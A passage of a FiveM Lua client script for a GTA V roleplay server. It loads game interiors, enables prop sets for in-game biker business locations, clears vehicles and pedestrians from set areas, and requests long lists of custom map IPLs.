local pdl = GetInteriorAtCoords(440.84, -983.14, 30.69)
LoadInterior(pdl)	

Citizen.CreateThread(function()
	LoadInterior(GetInteriorAtCoords(440.84, -983.14, 30.69))
end)

Citizen.CreateThread(function()
    while (true) do
        ClearAreaOfVehicles(-337.21,-1458.71,32.67, 300, 1) --GCM
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
    while (true) do
        ClearAreaOfVehicles(-490.21,274.12,83.24, 300, 1)
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
    while (true) do
        ClearAreaOfPeds(-490.21,274.12,83.24, 300, 1)
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
    while (true) do
        ClearAreaOfPeds(440.84, -983.14, 30.69, 300, 1)
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
RequestIpl("lafa2k_bkr_biker_dlc_int_02")
interiorID = GetInteriorAtCoords(889.67889404297,-2102.9304199219,30.761777877808)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "walls_01")
		EnableInteriorProp(interiorID, "lower_walls_default")
		EnableInteriorProp(interiorID, "furnishings_02")
		EnableInteriorProp(interiorID, "mural_03")
		EnableInteriorProp(interiorID, "decorative_02")
		EnableInteriorProp(interiorID, "gun_locker")
		EnableInteriorProp(interiorID, "mod_booth")
		EnableInteriorProp(interiorID, "meth_small")
		EnableInteriorProp(interiorID, "meth_medium")
		EnableInteriorProp(interiorID, "meth_large")
		EnableInteriorProp(interiorID, "cash_small")
		EnableInteriorProp(interiorID, "cash_medium")
		EnableInteriorProp(interiorID, "cash_large")
		EnableInteriorProp(interiorID, "weed_small")
		EnableInteriorProp(interiorID, "weed_medium")
		EnableInteriorProp(interiorID, "weed_large")
		EnableInteriorProp(interiorID, "coke_small")
		EnableInteriorProp(interiorID, "coke_medium")
		EnableInteriorProp(interiorID, "coke_large")
		EnableInteriorProp(interiorID, "counterfeit_small")
		EnableInteriorProp(interiorID, "counterfeit_medium")
		EnableInteriorProp(interiorID, "counterfeit_large")
		EnableInteriorProp(interiorID, "id_small")
		EnableInteriorProp(interiorID, "id_medium")
		EnableInteriorProp(interiorID, "id_large")
		SetInteriorPropColor(interiorID, "walls_01", 8)
		SetInteriorPropColor(interiorID, "lower_walls_default", 8)
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(96.47223, 6347.784,30.48238)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "weed_hosea")
		EnableInteriorProp(interiorID, "weed_hoseb")
		EnableInteriorProp(interiorID, "weed_hosec")
		EnableInteriorProp(interiorID, "weed_hosed")
		EnableInteriorProp(interiorID, "weed_hosee")
		EnableInteriorProp(interiorID, "weed_hosef")
		EnableInteriorProp(interiorID, "weed_hoseg")
		EnableInteriorProp(interiorID, "weed_hoseh")
		EnableInteriorProp(interiorID, "weed_hosei")
		EnableInteriorProp(interiorID, "weed_growtha_stage3")
		EnableInteriorProp(interiorID, "weed_growthb_stage3")
		EnableInteriorProp(interiorID, "weed_growthc_stage3")
		EnableInteriorProp(interiorID, "weed_growthd_stage3")
		EnableInteriorProp(interiorID, "weed_growthe_stage3")
		EnableInteriorProp(interiorID, "weed_growthf_stage3")
		EnableInteriorProp(interiorID, "weed_growthg_stage3")
		EnableInteriorProp(interiorID, "weed_growthh_stage3")
		EnableInteriorProp(interiorID, "weed_growthi_stage3")
		EnableInteriorProp(interiorID, "light_growtha_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthb_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthc_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthd_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthe_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthf_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthg_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthh_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthi_stage33_upgrade")
		EnableInteriorProp(interiorID, "weed_upgrade_equip")
		EnableInteriorProp(interiorID, "weed_drying")
		EnableInteriorProp(interiorID, "weed_security_upgrade")
		EnableInteriorProp(interiorID, "weed_production")
		EnableInteriorProp(interiorID, "weed_set_up")
		EnableInteriorProp(interiorID, "weed_chairs")
		RefreshInterior(interiorID)	
	end

interiorID = GetInteriorAtCoords(24.54136000, -1400.42700000,29.12644000)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "weed_upgrade_equip")
		EnableInteriorProp(interiorID, "counterfeit_security")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100a")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20a")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10a")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100b")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100c")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100d")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20b")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20c")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20d")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10b")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10c")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10d")
		EnableInteriorProp(interiorID, "counterfeit_setup")
		EnableInteriorProp(interiorID, "counterfeit_upgrade_equip")
		EnableInteriorProp(interiorID, "dryera_on")
		EnableInteriorProp(interiorID, "dryerb_on")
		EnableInteriorProp(interiorID, "dryerc_on")
		EnableInteriorProp(interiorID, "dryerd_on")
		EnableInteriorProp(interiorID, "money_cutter")
		EnableInteriorProp(interiorID, "special_chairs")
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(1497.75100000, 6393.09000000,21.78359000)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "meth_lab_upgrade")
		EnableInteriorProp(interiorID, "meth_lab_production")
		EnableInteriorProp(interiorID, "meth_lab_security_high")
		EnableInteriorProp(interiorID, "meth_lab_setup")
		EnableInteriorProp(interiorID, "counterfeit_standard_equip")
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(-1103.1722412109,4951.3447265625,234.8638)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "coke_cut_01")
		EnableInteriorProp(interiorID, "coke_cut_02")
		EnableInteriorProp(interiorID, "coke_cut_03")
		EnableInteriorProp(interiorID, "coke_cut_04")
		EnableInteriorProp(interiorID, "coke_cut_05")
		EnableInteriorProp(interiorID, "set_up")
		EnableInteriorProp(interiorID, "security_high")
		EnableInteriorProp(interiorID, "production_upgrade")
		EnableInteriorProp(interiorID, "equipment_upgrade")
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(2845.278,4441.969,47.50344)
	if IsValidInterior(interiorID) then
		RefreshInterior(interiorID)
	end	

RequestIpl("imp_impexp_interior_placement_interior_1_impexp")
interiorID = GetInteriorAtCoords(941.10520000,-971.67590000,39.39997000)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "branded_style_set")
		EnableInteriorProp(interiorID, "car_floor_hatch")
		EnableInteriorProp(interiorID, "door_blocker")
		RefreshInterior(interiorID)
	end		
end)

local pdl = GetInteriorAtCoords(440.84, -983.14, 30.69)
LoadInterior(pdl)


local bennys = GetInteriorAtCoords(-210.29,-1321.87,30.89)
LoadInterior(bennys)

Citizen.CreateThread(function()
RequestIpl("lafa2k_bkr_biker_dlc_int_02")
interiorID = GetInteriorAtCoords(889.67889404297,-2102.9304199219,30.761777877808)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "walls_01")
		EnableInteriorProp(interiorID, "lower_walls_default")
		EnableInteriorProp(interiorID, "furnishings_02")
		EnableInteriorProp(interiorID, "mural_03")
		EnableInteriorProp(interiorID, "decorative_02")
		EnableInteriorProp(interiorID, "gun_locker")
		EnableInteriorProp(interiorID, "mod_booth")
		EnableInteriorProp(interiorID, "meth_small")
		EnableInteriorProp(interiorID, "meth_medium")
		EnableInteriorProp(interiorID, "meth_large")
		EnableInteriorProp(interiorID, "cash_small")
		EnableInteriorProp(interiorID, "cash_medium")
		EnableInteriorProp(interiorID, "cash_large")
		EnableInteriorProp(interiorID, "weed_small")
		EnableInteriorProp(interiorID, "weed_medium")
		EnableInteriorProp(interiorID, "weed_large")
		EnableInteriorProp(interiorID, "coke_small")
		EnableInteriorProp(interiorID, "coke_medium")
		EnableInteriorProp(interiorID, "coke_large")
		EnableInteriorProp(interiorID, "counterfeit_small")
		EnableInteriorProp(interiorID, "counterfeit_medium")
		EnableInteriorProp(interiorID, "counterfeit_large")
		EnableInteriorProp(interiorID, "id_small")
		EnableInteriorProp(interiorID, "id_medium")
		EnableInteriorProp(interiorID, "id_large")
		SetInteriorPropColor(interiorID, "walls_01", 8)
		SetInteriorPropColor(interiorID, "lower_walls_default", 8)
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(96.47223, 6347.784,30.48238)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "weed_hosea")
		EnableInteriorProp(interiorID, "weed_hoseb")
		EnableInteriorProp(interiorID, "weed_hosec")
		EnableInteriorProp(interiorID, "weed_hosed")
		EnableInteriorProp(interiorID, "weed_hosee")
		EnableInteriorProp(interiorID, "weed_hosef")
		EnableInteriorProp(interiorID, "weed_hoseg")
		EnableInteriorProp(interiorID, "weed_hoseh")
		EnableInteriorProp(interiorID, "weed_hosei")
		EnableInteriorProp(interiorID, "weed_growtha_stage3")
		EnableInteriorProp(interiorID, "weed_growthb_stage3")
		EnableInteriorProp(interiorID, "weed_growthc_stage3")
		EnableInteriorProp(interiorID, "weed_growthd_stage3")
		EnableInteriorProp(interiorID, "weed_growthe_stage3")
		EnableInteriorProp(interiorID, "weed_growthf_stage3")
		EnableInteriorProp(interiorID, "weed_growthg_stage3")
		EnableInteriorProp(interiorID, "weed_growthh_stage3")
		EnableInteriorProp(interiorID, "weed_growthi_stage3")
		EnableInteriorProp(interiorID, "light_growtha_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthb_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthc_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthd_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthe_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthf_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthg_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthh_stage33_upgrade")
		EnableInteriorProp(interiorID, "light_growthi_stage33_upgrade")
		EnableInteriorProp(interiorID, "weed_upgrade_equip")
		EnableInteriorProp(interiorID, "weed_drying")
		EnableInteriorProp(interiorID, "weed_security_upgrade")
		EnableInteriorProp(interiorID, "weed_production")
		EnableInteriorProp(interiorID, "weed_set_up")
		EnableInteriorProp(interiorID, "weed_chairs")
		RefreshInterior(interiorID)	
	end

interiorID = GetInteriorAtCoords(24.54136000, -1400.42700000,29.12644000)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "weed_upgrade_equip")
		EnableInteriorProp(interiorID, "counterfeit_security")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100a")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20a")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10a")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100b")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100c")
		EnableInteriorProp(interiorID, "counterfeit_cashpile100d")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20b")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20c")
		EnableInteriorProp(interiorID, "counterfeit_cashpile20d")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10b")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10c")
		EnableInteriorProp(interiorID, "counterfeit_cashpile10d")
		EnableInteriorProp(interiorID, "counterfeit_setup")
		EnableInteriorProp(interiorID, "counterfeit_upgrade_equip")
		EnableInteriorProp(interiorID, "dryera_on")
		EnableInteriorProp(interiorID, "dryerb_on")
		EnableInteriorProp(interiorID, "dryerc_on")
		EnableInteriorProp(interiorID, "dryerd_on")
		EnableInteriorProp(interiorID, "money_cutter")
		EnableInteriorProp(interiorID, "special_chairs")
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(1497.75100000, 6393.09000000,21.78359000)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "meth_lab_upgrade")
		EnableInteriorProp(interiorID, "meth_lab_production")
		EnableInteriorProp(interiorID, "meth_lab_security_high")
		EnableInteriorProp(interiorID, "meth_lab_setup")
		EnableInteriorProp(interiorID, "counterfeit_standard_equip")
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(-1103.1722412109,4951.3447265625,234.8638)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "coke_cut_01")
		EnableInteriorProp(interiorID, "coke_cut_02")
		EnableInteriorProp(interiorID, "coke_cut_03")
		EnableInteriorProp(interiorID, "coke_cut_04")
		EnableInteriorProp(interiorID, "coke_cut_05")
		EnableInteriorProp(interiorID, "set_up")
		EnableInteriorProp(interiorID, "security_high")
		EnableInteriorProp(interiorID, "production_upgrade")
		EnableInteriorProp(interiorID, "equipment_upgrade")
		RefreshInterior(interiorID)
	end

interiorID = GetInteriorAtCoords(2845.278,4441.969,47.50344)
	if IsValidInterior(interiorID) then
		RefreshInterior(interiorID)
	end	

RequestIpl("imp_impexp_interior_placement_interior_1_impexp")
interiorID = GetInteriorAtCoords(941.10520000,-971.67590000,39.39997000)
	if IsValidInterior(interiorID) then
		EnableInteriorProp(interiorID, "branded_style_set")
		EnableInteriorProp(interiorID, "car_floor_hatch")
		EnableInteriorProp(interiorID, "door_blocker")
		RefreshInterior(interiorID)
	end		
end)

Citizen.CreateThread(function()

	--DisneyAllsuell
	RequestIpl("DisneyAllsuell_01")
	RequestIpl("DisneyAllsuell_02")
	RequestIpl("DisneyAllsuell_03")
	RequestIpl("DisneyAllsuell_04")
	RequestIpl("DisneyAllsuell_05")
	RequestIpl("DisneyAllsuell_06")
	RequestIpl("DisneyAllsuell_07")
	RequestIpl("DisneyAllsuell_08")
	RequestIpl("DisneyAllsuell_09")
	RequestIpl("DisneyAllsuell_10")
	RequestIpl("DisneyAllsuell_12")
	RequestIpl("DisneyAllsuell_13")
	RequestIpl("DisneyAllsuell_14")
	RequestIpl("DisneyAllsuell_15")
	RequestIpl("DisneyAllsuell_16")
	RequestIpl("DisneyAllsuell_17")
	RequestIpl("DisneyAllsuell_18")
	RequestIpl("DisneyAllsuell_19")
	RequestIpl("DisneyAllsuell_20")
	RequestIpl("DisneyAllsuell_21")

	--DisneyFamilies
	RequestIpl("DisneyFamilies_01")
	RequestIpl("DisneyFamilies_02")
	RequestIpl("DisneyFamilies_03")
	RequestIpl("DisneyFamilies_04")
	RequestIpl("DisneyFamilies_05")
	RequestIpl("DisneyFamilies_06")
	RequestIpl("DisneyFamilies_07")
	RequestIpl("DisneyFamilies_08")
	RequestIpl("DisneyFamilies_09")
	RequestIpl("DisneyFamilies_10")
	RequestIpl("DisneyFamilies_11")
	RequestIpl("DisneyFamilies_12")
	RequestIpl("DisneyFamilies_13")
	RequestIpl("DisneyFamilies_14")
	RequestIpl("DisneyFamilies_15")

	--DisneyForthills
	RequestIpl("DisneyForthills_01")
	RequestIpl("DisneyForthills_02")
	RequestIpl("DisneyForthills_03")
	RequestIpl("DisneyForthills_04")
	RequestIpl("DisneyForthills_05")
	RequestIpl("DisneyForthills_06")
	RequestIpl("DisneyForthills_07")
	RequestIpl("DisneyForthills_08")
	RequestIpl("DisneyForthills_09")
	RequestIpl("DisneyForthills_10")
	RequestIpl("DisneyForthills_11")
	RequestIpl("DisneyForthills_12")
	RequestIpl("DisneyForthills_13")
	RequestIpl("DisneyForthills_14")
	RequestIpl("DisneyForthills_15")
	RequestIpl("DisneyForthills_16")
	RequestIpl("DisneyForthills_17")
	RequestIpl("DisneyForthills_18")
	RequestIpl("DisneyForthills_19")		
	RequestIpl("DisneyForthills_20")
	RequestIpl("DisneyForthills_21")
	RequestIpl("DisneyForthills_22")
	RequestIpl("DisneyForthills_23")
	RequestIpl("DisneyForthills_24")
	RequestIpl("DisneyForthills_25")
	RequestIpl("DisneyForthills_26")
	RequestIpl("DisneyForthills_27")
	RequestIpl("DisneyForthills_28")
	RequestIpl("DisneyForthills_29")		
	RequestIpl("DisneyForthills_30")
	RequestIpl("DisneyForthills_31")
	RequestIpl("DisneyForthills_32")
	RequestIpl("DisneyForthills_33")
	RequestIpl("DisneyForthills_34")
	RequestIpl("DisneyForthills_35")
	RequestIpl("DisneyForthills_36")
	RequestIpl("DisneyForthills_37")
	RequestIpl("DisneyForthills_38")
	RequestIpl("DisneyForthills_39")		
	RequestIpl("DisneyForthills_40")
	RequestIpl("DisneyForthills_41")
	RequestIpl("DisneyForthills_42")
	RequestIpl("DisneyForthills_43")
	RequestIpl("DisneyForthills_44")
	RequestIpl("DisneyForthills_45")
	RequestIpl("DisneyForthills_46")
	RequestIpl("DisneyForthills_47")
	RequestIpl("DisneyForthills_48")
	RequestIpl("DisneyForthills_49")		
	RequestIpl("DisneyForthills_50")
	RequestIpl("DisneyForthills_51")
	RequestIpl("DisneyForthills_52")
	RequestIpl("DisneyForthills_53")
	RequestIpl("DisneyForthills_54")
	RequestIpl("DisneyForthills_55")
	RequestIpl("DisneyForthills_56")
	RequestIpl("DisneyForthills_57")
	RequestIpl("DisneyForthills_58")
	RequestIpl("DisneyForthills_59")		
	RequestIpl("DisneyForthills_60")
	RequestIpl("DisneyForthills_61")
	RequestIpl("DisneyForthills_62")
	RequestIpl("DisneyForthills_63")
	RequestIpl("DisneyForthills_64")
	RequestIpl("DisneyForthills_65")
	RequestIpl("DisneyForthills_66")
	RequestIpl("DisneyForthills_67")
	RequestIpl("DisneyForthills_68")
	RequestIpl("DisneyForthills_69")		
	RequestIpl("DisneyForthills_70")
	RequestIpl("DisneyForthills_71")
	RequestIpl("DisneyForthills_72")
	RequestIpl("DisneyForthills_73")
	RequestIpl("DisneyForthills_74")
	RequestIpl("DisneyForthills_75")
	RequestIpl("DisneyForthills_76")
	RequestIpl("DisneyForthills_77")
	RequestIpl("DisneyForthills_78")
	RequestIpl("DisneyForthills_79")		
	RequestIpl("DisneyForthills_80")
	RequestIpl("DisneyForthills_81")
	RequestIpl("DisneyForthills_82")
	RequestIpl("DisneyForthills_83")
	RequestIpl("DisneyForthills_84")
	RequestIpl("DisneyForthills_85")
	RequestIpl("DisneyForthills_86")
	RequestIpl("DisneyForthills_87")
	RequestIpl("DisneyForthills_88")
	RequestIpl("DisneyForthills_89")		
	RequestIpl("DisneyForthills_90")
	RequestIpl("DisneyForthills_91")
	RequestIpl("DisneyForthills_92")
	RequestIpl("DisneyForthills_93")
	RequestIpl("DisneyForthills_94")
	RequestIpl("DisneyForthills_95")
	RequestIpl("DisneyForthills_96")
	RequestIpl("DisneyForthills_97")
	RequestIpl("DisneyForthills_98")
	RequestIpl("DisneyForthills_99")		
	RequestIpl("DisneyForthills_100")

	--DisneyLuxury 
	RequestIpl("DisneyLuxury_01")
	RequestIpl("DisneyLuxury_02")
	RequestIpl("DisneyLuxury_03")
	RequestIpl("DisneyLuxury_04")
	RequestIpl("DisneyLuxury_05")
	RequestIpl("DisneyLuxury_06")
	RequestIpl("DisneyLuxury_07")
	RequestIpl("DisneyLuxury_08")
	RequestIpl("DisneyLuxury_09")
	RequestIpl("DisneyLuxury_10")
	RequestIpl("DisneyLuxury_11")
	RequestIpl("DisneyLuxury_12")
	RequestIpl("DisneyLuxury_13")
	RequestIpl("DisneyLuxury_14")
	RequestIpl("DisneyLuxury_15")
	RequestIpl("DisneyLuxury_16")
	RequestIpl("DisneyLuxury_17")
	RequestIpl("DisneyLuxury_18")
	RequestIpl("DisneyLuxury_19")
	RequestIpl("DisneyLuxury_20")
	RequestIpl("DisneyLuxury_21")
	RequestIpl("DisneyLuxury_22")
	RequestIpl("DisneyLuxury_23")
	RequestIpl("DisneyLuxury_24")
	RequestIpl("DisneyLuxury_25")
	RequestIpl("DisneyLuxury_26")
	RequestIpl("DisneyLuxury_27")
	RequestIpl("DisneyLuxury_28")
	RequestIpl("DisneyLuxury_29")
	RequestIpl("DisneyLuxury_30")
	RequestIpl("DisneyLuxury_31")
	RequestIpl("DisneyLuxury_32")
	RequestIpl("DisneyLuxury_33")
	RequestIpl("DisneyLuxury_34")
	RequestIpl("DisneyLuxury_35")
	RequestIpl("DisneyLuxury_36")
	RequestIpl("DisneyLuxury_37")
	RequestIpl("DisneyLuxury_38")
	RequestIpl("DisneyLuxury_39")
	RequestIpl("DisneyLuxury_40")
	RequestIpl("DisneyLuxury_41")
	RequestIpl("DisneyLuxury_42")
	RequestIpl("DisneyLuxury_43")
	RequestIpl("DisneyLuxury_44")
	RequestIpl("DisneyLuxury_45")
	RequestIpl("DisneyLuxury_46")
	RequestIpl("DisneyLuxury_47")
	RequestIpl("DisneyLuxury_48")
	RequestIpl("DisneyLuxury_49")
	RequestIpl("DisneyLuxury_50")
	RequestIpl("DisneyLuxury_51")
	RequestIpl("DisneyLuxury_52")
	RequestIpl("DisneyLuxury_53")
	RequestIpl("DisneyLuxury_54")
	RequestIpl("DisneyLuxury_55")
	RequestIpl("DisneyLuxury_56")
	RequestIpl("DisneyLuxury_57")
	RequestIpl("DisneyLuxury_58")
	RequestIpl("DisneyLuxury_59")
	RequestIpl("DisneyLuxury_60")
	RequestIpl("DisneyLuxury_61")
	RequestIpl("DisneyLuxury_62")
	RequestIpl("DisneyLuxury_63")
	RequestIpl("DisneyLuxury_64")
	RequestIpl("DisneyLuxury_65")
	RequestIpl("DisneyLuxury_66")
	RequestIpl("DisneyLuxury_67")
	RequestIpl("DisneyLuxury_68")
	RequestIpl("DisneyLuxury_69")
	RequestIpl("DisneyLuxury_70")		
	RequestIpl("DisneyLuxury_71")	

	--DisneyFranklinGueto
	RequestIpl("DisneyFranklinGueto_01")
	RequestIpl("DisneyFranklinGueto_02")
	RequestIpl("DisneyFranklinGueto_03")
	RequestIpl("DisneyFranklinGueto_04")
	RequestIpl("DisneyFranklinGueto_05")
	RequestIpl("DisneyFranklinGueto_06")
	RequestIpl("DisneyFranklinGueto_07")
	RequestIpl("DisneyFranklinGueto_08")
	RequestIpl("DisneyFranklinGueto_09")
	RequestIpl("DisneyFranklinGueto_10")
	RequestIpl("DisneyFranklinGueto_11")
	RequestIpl("DisneyFranklinGueto_12")
	RequestIpl("DisneyFranklinGueto_13")
	RequestIpl("DisneyFranklinGueto_14")
	RequestIpl("DisneyFranklinGueto_15")
	RequestIpl("DisneyFranklinGueto_16")
	RequestIpl("DisneyFranklinGueto_17")
	RequestIpl("DisneyFranklinGueto_18")
	RequestIpl("DisneyFranklinGueto_19")
	RequestIpl("DisneyFranklinGueto_20")

	--DisneyFranklins
	RequestIpl("DisneyFranklins_01")
	RequestIpl("DisneyFranklins_02")
	RequestIpl("DisneyFranklins_03")
	RequestIpl("DisneyFranklins_04")
	RequestIpl("DisneyFranklins_05")
	RequestIpl("DisneyFranklins_06")
	RequestIpl("DisneyFranklins_07")
	RequestIpl("DisneyFranklins_08")
	RequestIpl("DisneyFranklins_09")
	RequestIpl("DisneyFranklins_10")
	RequestIpl("DisneyFranklins_11")
	RequestIpl("DisneyFranklins_12")
	RequestIpl("DisneyFranklins_13")
	RequestIpl("DisneyFranklins_14")
	RequestIpl("DisneyFranklins_15")
	RequestIpl("DisneyFranklins_16")
	RequestIpl("DisneyFranklins_17")
	RequestIpl("DisneyFranklins_18")
	RequestIpl("DisneyFranklins_19")
	RequestIpl("DisneyFranklins_20")
	RequestIpl("DisneyFranklins_21")
	RequestIpl("DisneyFranklins_22")
	RequestIpl("DisneyFranklins_23")
	RequestIpl("DisneyFranklins_24")
	RequestIpl("DisneyFranklins_25")
	RequestIpl("DisneyFranklins_26")
	RequestIpl("DisneyFranklins_27")
	RequestIpl("DisneyFranklins_28")

	--DisneyLostudio
	RequestIpl("DisneyLostudio_01")
	RequestIpl("DisneyLostudio_02")
	RequestIpl("DisneyLostudio_03")
	RequestIpl("DisneyLostudio_04")
	RequestIpl("DisneyLostudio_05")
	RequestIpl("DisneyLostudio_06")
	RequestIpl("DisneyLostudio_07")
	RequestIpl("DisneyLostudio_08")
	RequestIpl("DisneyLostudio_09")
	RequestIpl("DisneyLostudio_10")
	RequestIpl("DisneyLostudio_11")
	RequestIpl("DisneyLostudio_12")
	RequestIpl("DisneyLostudio_13")
	RequestIpl("DisneyLostudio_14")
	RequestIpl("DisneyLostudio_15")
	RequestIpl("DisneyLostudio_16")
	RequestIpl("DisneyLostudio_17")
	RequestIpl("DisneyLostudio_18")
	RequestIpl("DisneyLostudio_19")
	RequestIpl("DisneyLostudio_20")
	RequestIpl("DisneyLostudio_21")
	RequestIpl("DisneyLostudio_22")
	RequestIpl("DisneyLostudio_23")
	RequestIpl("DisneyLostudio_24")
	RequestIpl("DisneyLostudio_25")
	RequestIpl("DisneyLostudio_26")
	RequestIpl("DisneyLostudio_27")
	RequestIpl("DisneyLostudio_28")
	RequestIpl("DisneyLostudio_29")
	RequestIpl("DisneyLostudio_30")
	RequestIpl("DisneyLostudio_31")
	RequestIpl("DisneyLostudio_32")
	RequestIpl("DisneyLostudio_33")
	RequestIpl("DisneyLostudio_34")
	RequestIpl("DisneyLostudio_35")
	RequestIpl("DisneyLostudio_36")
	RequestIpl("DisneyLostudio_37")
	RequestIpl("DisneyLostudio_38")
	RequestIpl("DisneyLostudio_39")
	RequestIpl("DisneyLostudio_40")
	RequestIpl("DisneyLostudio_41")
	RequestIpl("DisneyLostudio_42")
	RequestIpl("DisneyLostudio_43")
	RequestIpl("DisneyLostudio_44")
	RequestIpl("DisneyLostudio_45")
	RequestIpl("DisneyLostudio_46")
	RequestIpl("DisneyLostudio_47")
	RequestIpl("DisneyLostudio_48")
	RequestIpl("DisneyLostudio_49")
	RequestIpl("DisneyLostudio_50")
	RequestIpl("DisneyLostudio_51")
	RequestIpl("DisneyLostudio_52")
	RequestIpl("DisneyLostudio_53")
	RequestIpl("DisneyLostudio_54")
	RequestIpl("DisneyLostudio_55")
	RequestIpl("DisneyLostudio_56")
	RequestIpl("DisneyLostudio_57")
	RequestIpl("DisneyLostudio_58")

	--DisneyMansao
	RequestIpl("DisneyMansao_03")
	RequestIpl("DisneyMansao_04")
	RequestIpl("DisneyMansao_05")
	RequestIpl("DisneyMansao_06")
	RequestIpl("DisneyMansao_07")
	RequestIpl("DisneyMansao_08")
	RequestIpl("DisneyMansao_09")

	--DisneyMidspaz
	RequestIpl("DisneyMidspaz_01")
	RequestIpl("DisneyMidspaz_02")
	RequestIpl("DisneyMidspaz_03")
	RequestIpl("DisneyMidspaz_04")
	RequestIpl("DisneyMidspaz_05")
	RequestIpl("DisneyMidspaz_06")
	RequestIpl("DisneyMidspaz_07")
	RequestIpl("DisneyMidspaz_08")
	RequestIpl("DisneyMidspaz_09")
	RequestIpl("DisneyMidspaz_10")

	--DisneyPaletoBay
	RequestIpl("DisneyPaletoBay_01")
	RequestIpl("DisneyPaletoBay_02")
	RequestIpl("DisneyPaletoBay_03")
	RequestIpl("DisneyPaletoBay_04")
	RequestIpl("DisneyPaletoBay_05")
	RequestIpl("DisneyPaletoBay_06")
	RequestIpl("DisneyPaletoBay_07")
	RequestIpl("DisneyPaletoBay_08")
	RequestIpl("DisneyPaletoBay_09")
	RequestIpl("DisneyPaletoBay_10")
	RequestIpl("DisneyPaletoBay_11")
	RequestIpl("DisneyPaletoBay_12")
	RequestIpl("DisneyPaletoBay_13")
	RequestIpl("DisneyPaletoBay_14")
	RequestIpl("DisneyPaletoBay_15")
	RequestIpl("DisneyPaletoBay_16")
	RequestIpl("DisneyPaletoBay_17")
	RequestIpl("DisneyPaletoBay_18")
	RequestIpl("DisneyPaletoBay_19")
	RequestIpl("DisneyPaletoBay_20")
	RequestIpl("DisneyPaletoBay_21")
	RequestIpl("DisneyPaletoBay_22")
	RequestIpl("DisneyPaletoBay_23")
	RequestIpl("DisneyPaletoBay_24")
	RequestIpl("DisneyPaletoBay_25")
	RequestIpl("DisneyPaletoBay_26")
	RequestIpl("DisneyPaletoBay_27")
	RequestIpl("DisneyPaletoBay_28")
	RequestIpl("DisneyPaletoBay_29")
	RequestIpl("DisneyPaletoBay_30")
	RequestIpl("DisneyPaletoBay_31")

	--DisneyPaletoMotel
	RequestIpl("DisneyPaletoMotel_01")
	RequestIpl("DisneyPaletoMotel_02")
	RequestIpl("DisneyPaletoMotel_03")
	RequestIpl("DisneyPaletoMotel_04")
	RequestIpl("DisneyPaletoMotel_05")
	RequestIpl("DisneyPaletoMotel_06")
	RequestIpl("DisneyPaletoMotel_07")
	RequestIpl("DisneyPaletoMotel_08")
	RequestIpl("DisneyPaletoMotel_09")
	RequestIpl("DisneyPaletoMotel_11")
	RequestIpl("DisneyPaletoMotel_12")
	RequestIpl("DisneyPaletoMotel_13")
	RequestIpl("DisneyPaletoMotel_14")
	RequestIpl("DisneyPaletoMotel_15")
	RequestIpl("DisneyPaletoMotel_16")
	RequestIpl("DisneyPaletoMotel_17")
	RequestIpl("DisneyPaletoMotel_18")
	RequestIpl("DisneyPaletoMotel_19")
	RequestIpl("DisneyPaletoMotel_20")
	RequestIpl("DisneyPaletoMotel_21")
	RequestIpl("DisneyPaletoMotel_22")

	--DisneyPinkCageMotel
	RequestIpl("DisneyPinkCageMotel_01")
	RequestIpl("DisneyPinkCageMotel_02")
	RequestIpl("DisneyPinkCageMotel_03")
	RequestIpl("DisneyPinkCageMotel_04")
